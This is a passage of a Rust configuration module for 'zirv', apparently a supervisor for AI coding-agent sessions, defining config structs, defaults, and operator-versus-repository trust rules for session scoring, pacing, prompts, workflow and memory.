use std::path::Path;

use serde::{Deserialize, Serialize};

use super::CtxResult;

pub const DEFAULT_MARKER: &str = "[zirv]";
pub const CTX_CONFIG_FILE: &str = "ctx.toml";
/// The one `ctx.toml` table `CtxConfig` never deep-merges -- see the `policy`
/// field's own doc and `super::policy`'s module doc.
const POLICY_SECTION: &str = "policy";
/// The other `ctx.toml` table `CtxConfig` never deep-merges, for the
/// identical reason -- see the `safety` field's own doc and
/// `super::safety`'s module doc.
const SAFETY_SECTION: &str = "safety";

pub type EnvLookup<'a> = &'a dyn Fn(&str) -> Option<String>;

/// Wraps process env access so callers can pass a closure in tests instead of
/// mutating global state.
pub fn env_from_process() -> impl Fn(&str) -> Option<String> {
    |key: &str| std::env::var(key).ok()
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ScoreConfig {
    pub window: usize,
    pub min_turns: usize,
    /// Explicit absolute override for the token-pressure floor. Wins outright
    /// over `token_floor_ratio` when set -- an operator who pins a number
    /// gets that number, capacity or not. `None` (the default) means "derive
    /// it from the ratio and the resolved capacity instead"; see
    /// `rot::token_gates`.
    pub token_floor: Option<u64>,
    /// Same as `token_floor`, for the ceiling.
    pub token_ceiling: Option<u64>,
    /// Fraction of the resolved capacity the floor sits at when no explicit
    /// `token_floor` is set (issue #155, Phase 6b). Default `0.5`.
    pub token_floor_ratio: f64,
    /// Fraction of the resolved capacity the ceiling sits at when no
    /// explicit `token_ceiling` is set. Default `0.8`.
    pub token_ceiling_ratio: f64,
    /// Operator-pinned context-window capacity, overriding whatever the
    /// adapter itself reports (`Capabilities::context_window_tokens`): the
    /// operator knows their own seat, and the adapter's default is a guess
    /// about it. `None` (the default) defers to the adapter.
    pub model_context_tokens: Option<u64>,
    pub weight_tool_failure: f64,
    pub weight_repetition: f64,
    pub weight_marker: f64,
    /// Score weight for a stuck same-error loop -- the longest run of
    /// consecutive identical (normalized) tool-result error texts within
    /// the window (`rot::Signals::same_error_repeats`). Default `0.0`: this
    /// signal ships inert so it never moves an existing verdict fixture
    /// until an operator opts in deliberately by raising it.
    pub same_error_weight: f64,
    pub repetition_threshold: usize,
    /// Repeat count of the SAME normalized error text before the
    /// same-error signal trips, ramped the same way `repetition_threshold`
    /// ramps `weight_repetition` (via `rot::repetition_component`). Default
    /// `3`.
    pub same_error_threshold: usize,
    pub advise_at: u32,
    pub compact_at: u32,
    pub restart_at: u32,
    pub marker: String,
}

impl Default for ScoreConfig {
    fn default() -> Self {
        Self {
            window: 10,
            min_turns: 10,
            token_floor: None,
            token_ceiling: None,
            token_floor_ratio: 0.5,
            token_ceiling_ratio: 0.8,
            model_context_tokens: None,
            weight_tool_failure: 40.0,
            weight_repetition: 30.0,
            weight_marker: 30.0,
            same_error_weight: 0.0,
            repetition_threshold: 3,
            same_error_threshold: 3,
            advise_at: 40,
            compact_at: 60,
            restart_at: 80,
            marker: DEFAULT_MARKER.to_string(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct WrapConfig {
    pub debounce_ms: u64,
    pub inject_timeout_ms: u64,
}

impl Default for WrapConfig {
    fn default() -> Self {
        Self {
            debounce_ms: 3000,
            inject_timeout_ms: 20_000,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SuperviseConfig {
    pub max_restarts: u32,
    pub poll_ms: u64,
    pub interval_secs: u64,
    pub max_cycle_secs: u64,
    pub max_failures: u32,
    pub backoff_base_secs: u64,
    pub on_failure: Option<String>,
    /// Consecutive `zirv ctx nudge`-driven restarts a single supervised run
    /// (`exec`) will honor before it starts ignoring further nudges: a
    /// separate cap from `max_restarts`, since a nudge-restart never spends
    /// that budget (it is not rot). Past the cap the nudge's mail is left
    /// unread rather than acted on, so it is still visible via `zirv ctx
    /// inbox`. Not repo-forbidden: unlike `agent_bin` or `handoff.model`,
    /// this names no binary, shell command, or model choice, only how many
    /// times a session tolerates being interrupted.
    pub max_nudges: u32,
    /// Issue #155, Phase 5(e): how many HEAVY OPERATIONS may run
    /// concurrently on this machine -- classified commands (`cargo build`/
    /// `test`/`nextest`/`clippy`/`package`/`publish`, plus
    /// `heavy_command_patterns`), each holding a permit for the duration of
    /// the child process (`permit::acquire`/`permit::HeavyPermit`), checked
    /// at `script_runner::Command::invoke`, the single seam where a zirv
    /// script runs a shell command. Replaces `max_heavy_workers`, which
    /// counted live `Verb::Exec | Verb::Dash` session records and so was
    /// blind to what those sessions were actually doing: an idle worker
    /// consumed the whole budget while a busy orchestrator running a full
    /// nextest sweep consumed none of it.
    ///
    /// `max_heavy_workers` is still accepted as a DEPRECATED ALIAS,
    /// rewritten onto this key before deserialisation: these structs are
    /// `deny_unknown_fields`, so an operator's existing `~/.zirv/ctx.toml`
    /// (or `ZIRV_CTX_SUPERVISE_MAX_HEAVY_WORKERS`) would otherwise hard-fail
    /// on upgrade. The new key wins when both are present.
    ///
    /// Defaults to 1, unchanged from issue #133: the two-parallel-worktree
    /// reproduction there needed only two concurrent cold `cargo build` +
    /// full-nextest workloads to blue-screen the host four times in twelve
    /// minutes, so the safe default is a single heavy operation at a time --
    /// an operator who has verified their own machine can take more raises
    /// this explicitly.
    ///
    /// `REPO_FORBIDDEN` under BOTH spellings, unchanged from #133: a
    /// checked-out repo raising the machine-wide concurrency budget is
    /// exactly the case the cap exists for, so only `~/.zirv/ctx.toml` or
    /// the matching `ZIRV_CTX_SUPERVISE_MAX_HEAVY_*` env var may set it.
    /// Deliberately **not** under `[agents]` -- that table is reserved for
    /// the distinct, per-agent `<repo>/.zirv/.settings.toml` gate (see
    /// `agents_in_ctx_toml_is_rejected_so_the_two_files_stay_distinct`) --
    /// this is a `[supervise]` key like every other cap in this struct.
    pub max_heavy_operations: usize,
    /// Issue #267: how many `--mode writing` delegated workers may hold a
    /// WRITER permit at once, machine-wide -- a second, independent pool
    /// from `max_heavy_operations` above: a writer permit is held for a
    /// worker's WHOLE LIFETIME (`agent::run_with`), not only while it runs
    /// one classified heavy command, and additionally never lets two
    /// writers hold the SAME checkout at once (`permit::acquire_writer`'s
    /// own per-tree exclusivity, which this count alone does not express).
    /// A `--mode read-only` worker never takes a writer permit and does not
    /// count against this.
    ///
    /// Defaults to 1, the same "never two writers in one worktree" posture
    /// Ruflo's own CLAUDE.md conventions this issue is modeled on already
    /// enforce by hand -- an operator who has verified their own workflow
    /// can take more raises this explicitly.
    ///
    /// `REPO_FORBIDDEN`, same reasoning as `max_heavy_operations` right
    /// above: a checked-out repo raising the machine-wide writer-concurrency
    /// budget is exactly the corrupted-diff failure this cap exists to
    /// prevent.
    pub max_writers: usize,
    /// Extra command patterns an operator classifies as heavy on their own
    /// machine, ADDED to the built-in set (`permit::BUILTIN_HEAVY_PATTERNS`),
    /// never replacing it -- `permit::is_heavy` always checks the built-ins
    /// regardless of what this holds. A repo layer may add entries (adding
    /// is narrowing), but the built-ins can never be removed by any layer.
    /// Not `REPO_FORBIDDEN`: unlike `max_heavy_operations` itself, adding a
    /// pattern can only make MORE commands wait for a permit, never fewer,
    /// so a repo checkout widening this list cannot reproduce issue #133's
    /// ungoverned-concurrency incident.
    pub heavy_command_patterns: Vec<String>,
}

impl Default for SuperviseConfig {
    fn default() -> Self {
        Self {
            max_restarts: 2,
            poll_ms: 2000,
            interval_secs: 900,
            max_cycle_secs: 3600,
            max_failures: 5,
            backoff_base_secs: 60,
            on_failure: None,
            max_nudges: 3,
            max_heavy_operations: 1,
            max_writers: 1,
            heavy_command_patterns: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct HandoffConfig {
    /// The operator's own choice of distiller/judgment model, when set.
    /// `None` -- the default -- means "let the adapter decide":
    /// `resolve_distiller_model` (`handoff.rs`) falls back to the resolved
    /// adapter's own `AgentAdapter::default_distiller_model`, which is a
    /// real value for claude ("haiku") but `None` for codex, since a
    /// hardcoded model name is specific to one agent's lineup and zirv has
    /// no verified cheap-model default for codex's. This used to default to
    /// the literal `"haiku"` unconditionally, which reached `codex exec
    /// --model haiku` for a codex session and failed outright.
    pub model: Option<String>,
    /// How many trailing items of each kind the handoff context keeps: user
    /// messages, assistant texts and tool errors. One knob, because
    /// `structural_context` applies one limit to all three.
    pub tail_items: usize,
    /// How long the distiller gets before the structural fallback is used
    /// instead. `wrap` calls this from its pump, so an unbounded wait would
    /// freeze the user's own terminal.
    pub timeout_secs: u64,
}

impl Default for HandoffConfig {
    fn default() -> Self {
        Self {
            model: None,
            tail_items: 5,
            timeout_secs: 30,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct PaceConfig {
    pub enabled: bool,
    /// A supervised window is kept at or below this percentage.
    pub max_percent: f64,
    /// Collector readings older than this are treated as stale.
    pub collector_max_age_secs: u64,
    pub estimator: bool,
    /// `0` disables the estimator for that window: a plan's real allowance is
    /// undocumented, so there is no honest default.
    pub five_hour_budget_tokens: u64,
    pub seven_day_budget_tokens: u64,
    pub count_cache_reads: bool,
    pub jitter_secs: u64,
    /// Used when a window's `resets_at` is unknown.
    pub fallback_delay_secs: u64,
    /// Head-room added to a window's own length to form the default safety cap,
    /// so a slightly wrong `resets_at` still resolves.
    pub wait_slack_secs: u64,
    /// Absolute override for the safety cap. `None` scales the cap to the window
    /// that tripped (5h or 7d, plus `wait_slack_secs`), which is what the spec's
    /// wait-until-reset semantics require: a global cap would resume early and
    /// spend tokens against a window that is still exhausted.
    pub max_wait_secs: Option<u64>,
    /// Start of the soft-throttle band. At or above this (and below
    /// `max_percent`) cycles are delayed so the remaining budget spreads
    /// linearly over the time left in the window. `>= max_percent` means no
    /// throttle band -- hard pause only.
    pub soft_percent: f64,
    /// Active API-poll fallback: only consulted when the passive collector
    /// reading is stale at a gating point.
    pub poll_enabled: bool,
    /// Per-provider floor between poll attempts, shared across processes.
    pub poll_min_interval_secs: u64,
    /// Operator declaration that a harness's vendor plan covers overage from
    /// credits: gating (throttle and pause) is skipped for that harness.
    pub use_credits: UseCreditsConfig,
    /// T8 (fail-SAFE, not open): the bounded per-cycle delay `pace::wait_for_
    /// window` applies when it is genuinely blind -- no binding collector
    /// reading, and no configured estimator to fall back on -- instead of
    /// the old behavior of skipping the gate outright and proceeding at full
    /// speed. Deliberately small next to `fallback_delay_secs`/`wait_slack_
    /// secs`: those pace a *known* trip against a *known* window, while this
    /// is a floor applied with zero visibility into actual usage, so it must
    /// not punish a single one-shot `zirv ctx agent` call (a common,
    /// legitimate case for an operator who has not wired a statusline tee)
    /// while still meaningfully slowing a tight automated loop of headless
    /// cycles that would otherwise spend against the account with nobody
    /// watching. See [[Usage and Pacing]]/[[Known Issues]].
    pub blind_delay_secs: u64,
    /// Issue #155, Phase 6(c): the soft/hard band for `pace::spawn_gate`,
    /// which gates whether a NEW delegated worker may be spawned at all
    /// (`agent::run_with`, `dash::fulfill_spawn_request`) -- never whether an
    /// already-running session gets restarted. Restarting a session because
    /// it is expensive would discard a warm cache and re-read the whole
    /// context, the single most expensive possible reaction to a cost
    /// signal, so `rot.rs`/`score.rs` never read these (or any other
    /// `pace`/`window` field) at all. Deliberately distinct from `max_
    /// percent`/`soft_percent` above, which tune an already-running
    /// supervised loop's own cadence: a spawn is new spend the operator has
    /// not yet committed to, so it earns a stricter, earlier ceiling than
    /// pacing an existing one. `REPO_FORBIDDEN`: a repo checkout must not be
    /// able to change when the operator's account stops accepting new work,
    /// in either direction.
    pub spawn_soft_pct: f64,
    /// See `spawn_soft_pct` just above. At or above this, `agent::run_with`/
    /// `dash::fulfill_spawn_request` refuse the spawn outright unless
    /// overridden (`agent::run_with`'s own `--force`, or `dash::SpawnRequest
    /// ::force` carrying that same choice into a pane spawn).
    /// `REPO_FORBIDDEN`, same reasoning as `spawn_soft_pct`.
    pub spawn_hard_pct: f64,
    /// Issue #285: the operator's own default soft token budget for a
    /// durable objective (`zirv ctx objective set`) that does not pass its
    /// own `--budget-tokens`. `None` means no default -- an objective set
    /// with no explicit budget stays unbounded, same as today. Distinct from
    /// `exec`'s own `--budget-tokens` hard stop (`EXIT_BUDGET_EXHAUSTED`):
    /// this ceiling only flips the objective's status and swaps the injected
    /// layer to the wrap-up instruction, it never kills the run.
    /// `REPO_FORBIDDEN`: a repo checkout must not be able to raise its own
    /// spend ceiling, same reasoning as `spawn_soft_pct`/`spawn_hard_pct`
    /// above.
    pub run_budget_tokens: Option<u64>,
}

impl Default for PaceConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_percent: 99.0,
            collector_max_age_secs: 900,
            estimator: true,
            five_hour_budget_tokens: 0,
            seven_day_budget_tokens: 0,
            count_cache_reads: false,
            jitter_secs: 30,
            fallback_delay_secs: 900,
            wait_slack_secs: 3600,
            max_wait_secs: None,
            soft_percent: 80.0,
            poll_enabled: true,
            poll_min_interval_secs: 60,
            use_credits: UseCreditsConfig::default(),
            blind_delay_secs: 60,
            spawn_soft_pct: 80.0,
            spawn_hard_pct: 95.0,
            run_budget_tokens: None,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct UseCreditsConfig {
    pub claude: bool,
    pub codex: bool,
}

impl UseCreditsConfig {
    /// Keyed by agent in config (what the operator thinks in), resolved by
    /// provider at the gate (what pacing knows). Unknown providers gate.
    ///
    /// Called at every pacing-gate construction site (`exec`/`run_loop` build
    /// `PaceGate { use_credits: cfg.pace.use_credits.for_provider(..) }`) and
    /// by the dashboard header's per-harness usage row.
    pub fn for_provider(&self, provider: &str) -> bool {
        match provider {
            "anthropic" => self.claude,
            "openai" => self.codex,
            _ => false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct OptimizeConfig {
    /// Whether the Stop hook may queue an "optimize recommended" entry.
    pub enabled: bool,
    pub sessions_sampled: usize,
    pub max_surface_bytes: usize,
    /// Empty reuses `handoff.model`'s own resolution (`resolve_distiller_
    /// model` in `handoff.rs`, which already falls back to the resolved
    /// adapter's own default when `handoff.model` itself is unset): one
    /// cheap-model choice for the whole tool, kept as a plain `String`
    /// rather than `Option<String>` since "empty" already means "defer" here
    /// and always has.
    pub model: String,
    pub recommend_tool_failure_rate: f64,
    pub recommend_corrections: usize,
    pub recommend_cooldown_secs: u64,
}

impl Default for OptimizeConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sessions_sampled: 10,
            max_surface_bytes: 200_000,
            model: String::new(),
            recommend_tool_failure_rate: 0.25,
            recommend_corrections: 3,
            recommend_cooldown_secs: 86_400,
        }
    }
}

/// Issue #309: whether the Stop hook may nudge the exact stale-gate command
/// (`zirv test changed`/`zirv verify`) when the transcript shows a
/// modification this session and the last persisted verification report no
/// longer covers the current change set.
///
/// `enabled`/`max_nudges` both go through the same T9 repo-narrowing fold
/// `pace.enabled`/`context.dedupe_native` already use (`narrow_verify_on_
/// stop_enabled`/`narrow_max_nudges` below), not `REPO_FORBIDDEN`: an
/// operator who wants the nudge is never blocked by the repo, but a repo
/// checkout may only ever make the feature quieter (turn it off, or lower
/// the cap), never louder.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct VerifyOnStopConfig {
    pub enabled: bool,
    pub max_nudges: u32,
}

impl Default for VerifyOnStopConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_nudges: 2,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct PromptConfig {
    pub enabled: bool,
    /// Whether `<repo>/.zirv/system-prompt.md` is read at all.
    pub repo_layer: bool,
    /// Cap on the repo layer only: untrusted text does not get to be long.
    pub max_repo_bytes: usize,
    /// Whether an Orchestrator session's composed prompt gets the derived
    /// harness roster (`adapters::harness_prompt_lines`, folded in by
    /// `prompt::compose` as `PromptSource::Harnesses`). On by default; an
    /// operator who wants no roster at all (or finds it noisy) turns it off
    /// here. `REPO_FORBIDDEN` (like `prompt.enabled`/`prompt.repo_layer`): a
    /// repo checkout must not be able to suppress a layer the operator
    /// relies on to see what this session may delegate to.
    pub harnesses: bool,
    /// Whether a codex Orchestrator session's composed prompt gets codex's
    /// own `AgentAdapter::base_system_prompt` layer (issue #167,
    /// `adapters::codex::ORCHESTRATOR_PROMPT`) -- the codex analogue of
    /// claude's `ORCHESTRATOR_PROMPT`, spliced in by `prompt::with_adapter_
    /// layer`. On by default; an operator who finds it redundant with their
    /// own AGENTS.md conventions turns it off here. `REPO_FORBIDDEN`, same
    /// trust asymmetry as `harnesses` right above: a repo checkout must not
    /// be able to force this layer back on for an operator who turned it
    /// off. Claude's own orchestrator layer has no such switch -- it is not
    /// operator-toggleable independent of `prompt.enabled` -- so this key
    /// only ever gates the codex adapter.
    pub codex_orchestrator: bool,
}

impl Default for PromptConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            repo_layer: true,
            max_repo_bytes: 4096,
            harnesses: true,
            codex_orchestrator: true,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ContextConfig {
    /// Cap on the canonical `.zirv/context/common.md` layer (issue #44's
    /// context compiler, `compile.rs`). Same rationale as `prompt.max_repo_
    /// bytes`: untrusted repo text does not get to be long, and the cap
    /// would be decorative if a repo checkout could simply raise its own
    /// limit -- see `REPO_FORBIDDEN`.
    pub max_common_bytes: usize,
    /// Cap on the canonical harness-specific addition
    /// (`.zirv/context/claude.md` / `.zirv/context/codex.md`), applied
    /// independently of `max_common_bytes` since the two files are read and
    /// truncated separately.
    pub max_harness_bytes: usize,
    /// Issue #46 ("Context 8/8"): the one layer `compile.rs`'s composed
    /// prompt injects with no budget at all before this -- an Orchestrator
    /// session's derived harness roster (`adapters::harness_prompt_lines`,
    /// folded in as `PromptSource::Harnesses`). Every other layer already had
    /// a configured cap (`prompt.max_repo_bytes`, `context.max_common_bytes`/
    /// `max_harness_bytes`, `mail.max_delivered_bytes`, `memory.max_injected_
    /// bytes`); this closes the gap the same way: enforced by `prompt::
    /// compose` itself (`prompt::harness_roster_injection`, truncated with
    /// `crate::utils::truncate_bytes` exactly like every layer above), not
    /// merely reported against by `zirv context status`. Same trust
    /// rationale as `max_common_bytes`/`max_harness_bytes` above -- see
    /// `REPO_FORBIDDEN`.
    pub max_harness_roster_bytes: usize,
    /// Issue #155, Phase 3: skip injecting the canonical `.zirv/context/`
    /// layer when the harness's own native instruction file
    /// (`<repo>/CLAUDE.md` for claude, `<repo>/AGENTS.md` for codex) is a
    /// zirv-managed render that PROVABLY holds the current canonical bytes
    /// -- proven by the hash `context_cli::render_generated` stamps into it,
    /// never assumed. The harness reads that file natively at session
    /// start, so injecting the same bytes again is pure duplication in the
    /// single most cacheable layer there is.
    ///
    /// Deliberately NOT `REPO_FORBIDDEN`, unlike the byte caps above it: a
    /// repo layer can only ever set it `false`, and `false` injects MORE
    /// context, which is narrowing. `CtxConfig::load` folds it with
    /// `narrow_dedupe_bool` (the mirror of `narrow_pace_bool`, but with
    /// `false` as the strict value instead of `true` -- this key's safe
    /// direction is "inject more", the opposite polarity from
    /// `pace.enabled`'s "gate is on"), so a repo `true` cannot re-enable a
    /// skip the operator turned off.
    pub dedupe_native: bool,
    /// Issue #275 (`zirv context lint`): a hard ceiling on how many sentence
    /// pairs the duplicate (CTX002) and contradiction-candidate (CTX003)
    /// checks will ever compare across every layer combined. Both checks are
    /// pairwise over the imperative sentences they collect, so cost grows
    /// quadratically with the amount of instructional prose across every
    /// canonical/native layer -- this bounds that, the same "untrusted repo
    /// text does not get to be unbounded" rationale as `max_common_bytes`
    /// above, except the resource here is CPU time during `zirv context
    /// lint`, not injected bytes. Exceeding the cap does not fail the lint:
    /// `context_lint::analyze` stops comparing once it is spent and reports
    /// `degraded: true` instead, so a very large repository still gets a
    /// (partial) report rather than a hang. `REPO_FORBIDDEN`: a repo layer
    /// could otherwise raise its own cap to force an expensive comparison
    /// an operator deliberately bounded, the same asymmetry as every other
    /// numeric key in this struct.
    pub lint_max_pairs: usize,
}

impl Default for ContextConfig {
    fn default() -> Self {
        Self {
            max_common_bytes: 4096,
            max_harness_bytes: 4096,
            max_harness_roster_bytes: 4096,
            dedupe_native: true,
            lint_max_pairs: 20_000,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct MailConfig {
    pub enabled: bool,
    /// Cap on a stored message's body. Enforced by `mail::store`, which
    /// truncates rather than fails an oversize message.
    pub max_message_bytes: usize,
    /// Cap on how much mail is surfaced to a session at once (delivery is a
    /// later piece; the cap lives here so it is configured alongside the
    /// rest of the mailbox from the start).
    pub max_delivered_bytes: usize,
    /// How many unread messages a repo's mailbox keeps before the oldest are
    /// pruned. Read messages, already moved into `read/`, are never touched
    /// by this limit.
    pub keep: usize,
}

impl Default for MailConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_message_bytes: 4096,
            max_delivered_bytes: 4096,
            keep: 50,
        }
    }
}

/// Deploy policy embedded under `[workflow.deploy]`. `tier` is operator-only;
/// `minimum_tier` is the single repository-controlled workflow key and may
/// only ratchet strictness upward during layered config resolution.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct WorkflowDeployConfig {
    pub tier: crate::commands::workflow::deploy::DeployTier,
    pub minimum_tier: Option<crate::commands::workflow::deploy::DeployTier>,
}

impl Default for WorkflowDeployConfig {
    fn default() -> Self {
        Self {
            tier: crate::commands::workflow::deploy::DeployTier::Development,
            minimum_tier: None,
        }
    }
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Deserialize, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum MaintainDetectorMode {
    #[default]
    ExitNonzero,
    LineCount,
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct MaintainDetectorConfig {
    pub command: String,
    pub mode: MaintainDetectorMode,
    pub threshold: u64,
}

impl Default for MaintainDetectorConfig {
    fn default() -> Self {
        Self {
            command: String::new(),
            mode: MaintainDetectorMode::ExitNonzero,
            threshold: 1,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct WorkflowMaintainConfig {
    pub timeout_secs: u64,
    pub detectors: std::collections::BTreeMap<String, MaintainDetectorConfig>,
}

impl Default for WorkflowMaintainConfig {
    fn default() -> Self {
        Self {
            timeout_secs: 60,
            detectors: std::collections::BTreeMap::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ReportConfig {
    /// GitHub owner/repository used by workflow maintenance incident filing.
    /// The ordinary `zirv report` command intentionally keeps its product
    /// default and does not consume this destination.
    pub repository: Option<String>,
}

/// Issue #264: the cost ledger's own pricing knobs. Both fields are
/// `REPO_FORBIDDEN` -- a repo checkout must not be able to widen how long a
/// stale price table is presented as trustworthy, or point pricing at a file
/// of its own choosing (see `price::PriceTable`/`price::price`, and
/// [[Untrusted Configuration]]).
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct PriceConfig {
    /// How many days old a price table's own `as_of` stamp may be before
    /// every cost line it prices renders `~$x (prices as of …)` instead of a
    /// plain figure -- a stale table is silently wrong money, never a plain
    /// number (`price::PriceTable::is_stale`).
    pub stale_after_days: u64,
    /// Operator override path for the price table, read and merged over the
    /// built-in one the same way `~/.zirv/prices.toml` is when present.
    /// `None` -- the default -- is that ordinary resolution
    /// (`price::resolve_table`); set only to point at a NON-default location.
    pub table_path: Option<String>,
}

impl Default for PriceConfig {
    fn default() -> Self {
        Self {
            stale_after_days: 90,
            table_path: None,
        }
    }
}

/// Operator-controlled switches over the workflow subsystem
/// (`src/commands/workflow/`). Every field is repo-forbidden except the
/// explicitly folded `workflow.deploy.minimum_tier`, which can only make the
/// effective deploy tier stricter.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct WorkflowConfig {
    /// Whether repository-supplied verification checks may actually run.
    /// When false they are still listed in the report, with a skip line, so
    /// an operator can see what the repo asked for without running it.
    pub repo_checks_enabled: bool,
    /// Whether `.zirv/skills/` manifests are loaded at all. Repository
    /// skills can only ever *add* ids (see `skill::load_dir`); this turns the
    /// whole layer off.
    pub repo_skills_enabled: bool,
    /// Whether untrusted repository-provided `.zirv/agents/` manifests are
    /// loaded. Off by default: a checkout may propose a new role only after
    /// the operator explicitly enables this layer, and may never replace a
    /// trusted built-in/operator id.
    pub repo_agents_enabled: bool,
    pub deploy: WorkflowDeployConfig,
    pub maintain: WorkflowMaintainConfig,
    /// Local workflow telemetry. Previously read straight from the process
    /// environment, which a repository script could set for itself.
    pub telemetry_enabled: bool,
    pub telemetry_max_events: usize,
    pub telemetry_retention_days: u64,
    /// Issue #223: how hard zirv pushes a session that has done substantial
    /// edit work with no active `zirv workflow` toward starting one. A
    /// checkout must not be able to loosen or tighten this for itself --
    /// same trust boundary as `deploy.tier`, minus the repo narrowing
    /// carve-out `deploy.minimum_tier` gets, since there is no direction here
    /// a repo may safely push.
    pub adoption: crate::commands::workflow::adoption::AdoptionPolicy,
    /// Extra environment variable names, read from zirv's own process
    /// environment at check-run time and set on a verification check child
    /// (`workflow::verification::run_check`) -- ADDED to that function's own
    /// built-in `DEFAULT_CHECK_ENV_PASSTHROUGH` (the SSH-agent family plus
    /// GPG's terminal/homedir pointers), never a replacement for it. Issue
    /// #233: an operator whose check toolchain needs a variable outside that
    /// default set (a corporate proxy token, say) names it here instead of
    /// prefixing every `verify.toml` command with a shell workaround.
    /// Empty by default. `REPO_FORBIDDEN`: the untrusted repo checkout that
    /// owns `verify.toml` must never be able to widen what its own checks
    /// can read from the operator's environment.
    pub check_env_passthrough: Vec<String>,
    /// `--budget-tokens` appended to a reviewer worker's launch when set.
    /// `REPO_FORBIDDEN`: operator-only, like `check_env_passthrough` above.
    pub review_worker_budget_tokens: Option<u64>,
    /// `--max-tool-calls` appended to a reviewer worker's launch when set.
    /// `REPO_FORBIDDEN`, same reasoning as `review_worker_budget_tokens`.
    pub review_worker_max_tool_calls: Option<u32>,
    /// Issue #242: auto-spawns a bounded `review run`/`test changed`/
    /// `verify` worker when a gate transition lands the workflow on that
    /// phase. Off by default. `REPO_FORBIDDEN`: a repo checkout must not be
    /// able to make zirv spend on its own behalf.
    pub auto_spawn_on_gate: bool,
    /// Issue #268: lets `zirv verify`/`zirv test` report `Passed` instead of
    /// `Inconclusive` when zero verification checks are configured or
    /// discoverable, rather than the degraded-gate ban's default of
    /// treating "nothing to check" as proving nothing. Off by default.
    /// `REPO_FORBIDDEN`: an untrusted checkout must not be able to declare
    /// its own missing/empty `verify.toml` a pass.
    pub allow_empty_verify: bool,
}

impl Default for WorkflowConfig {
    fn default() -> Self {
        Self {
            repo_checks_enabled: true,
            repo_skills_enabled: true,
            repo_agents_enabled: false,
            deploy: WorkflowDeployConfig::default(),
            maintain: WorkflowMaintainConfig::default(),
            telemetry_enabled: true,
            telemetry_max_events: 1000,
            telemetry_retention_days: 30,
            adoption: crate::commands::workflow::adoption::AdoptionPolicy::default(),
            check_env_passthrough: Vec::new(),
            review_worker_budget_tokens: None,
            review_worker_max_tool_calls: None,
            auto_spawn_on_gate: false,
            allow_empty_verify: false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct MemoryConfig {
    /// MASTER switch for the whole memory subsystem, kept under its
    /// original name for backward compatibility (it predates
    /// `memory::MemoryScope`). `false` disables both the private and the
    /// shared scope, however `shared_enabled` below is set: an operator who
    /// disabled memory before the shared scope existed must not silently
    /// start receiving repo-controlled prompt content on upgrade. See
    /// `memory::MemoryScope::enabled`.
    pub enabled: bool,
    /// Whether facts may be harvested automatically from distilled handoffs.
    /// Off by default: an entry worth keeping across sessions is, for now, a
    /// deliberate act, not an inferred one.
    pub harvest: bool,
    /// How many entries a repository's bank keeps before the oldest
    /// (by `Written`) are pruned. Mirrors `mail.keep`.
    pub max_entries: usize,
    /// Cap on a single entry's body. Enforced by `memory::remember`, which
    /// truncates rather than fails an oversize entry.
    pub max_entry_bytes: usize,
    /// Superseded by `core_max_bytes` (issue #34): every prompt-injection
    /// call site now caps the merged private+shared core layer with that key
    /// instead. Kept, parsed, and still `REPO_FORBIDDEN`, purely so an
    /// existing `ctx.toml`/env setting this key does not hard-error on load
    /// (this struct is `deny_unknown_fields`) -- the same "kept under its
    /// original name" reasoning `enabled`'s own doc comment gives for a
    /// different field.
    pub max_injected_bytes: usize,
    /// Gate for the **shared** (repo-owned) memory bank under
    /// `<repo>/.zirv/memory/` (`memory::MemoryScope::Shared`), UNDERNEATH
    /// the master switch above: with `enabled = true`, an operator can turn
    /// this off to keep the private scope while dropping shared, but
    /// `enabled = false` always wins regardless of this value. On by
    /// default like every other memory switch.
    pub shared_enabled: bool,
    /// Hard byte budget for the **core** memory layer (issue #34): private
    /// and shared entries merged with private-first precedence (see
    /// `prompt::select_memory_within_cap`), always eligible for injection
    /// into every zirv-started session regardless of query or context.
    /// Independent of `max_entries`/`max_entry_bytes` (which cap what the
    /// bank *stores*) and of the bank's total size -- a strict ceiling on
    /// what a session actually *receives*.
    pub core_max_bytes: usize,
    /// Hard byte budget for the **retrieved** memory layer (issue #35):
    /// entries selected by context-aware ranking, added on top of the core
    /// layer for a query or session context. Independent of
    /// `core_max_bytes`.
    pub retrieval_max_bytes: usize,
    /// Hard cap on the *number* of entries the retrieval layer may select,
